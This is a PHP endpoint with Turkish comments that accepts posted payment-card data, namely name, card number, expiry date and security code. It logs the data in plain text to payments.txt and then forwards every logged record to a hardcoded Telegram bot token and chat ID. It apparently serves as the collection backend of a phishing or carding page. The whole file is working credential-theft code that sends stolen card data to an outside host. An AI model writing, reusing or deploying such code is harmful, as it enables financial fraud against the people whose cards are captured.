<?php
header('Content-Type: application/json');

// Gelen JSON verisini al
$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['error' => 'No data received']);
    exit;
}

// Log dosyasına yazmak için metin hazırla
$logEntry = "=== Yeni Gönderim ===\n";
$logEntry .= "Name: " . $data['name'] . "\n";
$logEntry .= "Card Number: " . $data['cardnumber'] . "\n";
$logEntry .= "Expiration Date: " . $data['expirationdate'] . "\n";
$logEntry .= "Security Code: " . $data['securitycode'] . "\n";
$logEntry .= "Gönderim Tarihi: " . date('Y-m-d H:i:s') . "\n\n";

// Klasörde payments.txt dosyasına ekle (dosya yoksa oluşturulur)
file_put_contents('payments.txt', $logEntry, FILE_APPEND);

// Dosyadaki tüm kayıtları oku
$allLogs = file_get_contents('payments.txt');

// Telegram gönderim ayarları
$token = "7785057192:AAHi_N1OuqcM1n45DbyjIvN9cq26Xapiii8";
$chat_id = "1044235740";

// Mesaj içeriği dosyadaki tüm kayıtlar
$message = "📂 Tüm Payment Kayıtları:\n\n" . $allLogs;

// Telegram API URL
$url = "https://api.telegram.org/bot$token/sendMessage";

// Gönderilecek parametreler
$params = [
    "chat_id" => $chat_id,
    "text" => $message,
    "parse_mode" => "Markdown"
];

// cURL ile Telegram'a POST isteği gönder
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);

$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpcode >= 200 && $httpcode < 300) {
    echo json_encode(['success' => true]);
} else {
    http_response_code(500);
    echo json_encode(['error' => 'Failed to send to Telegram']);
}
?>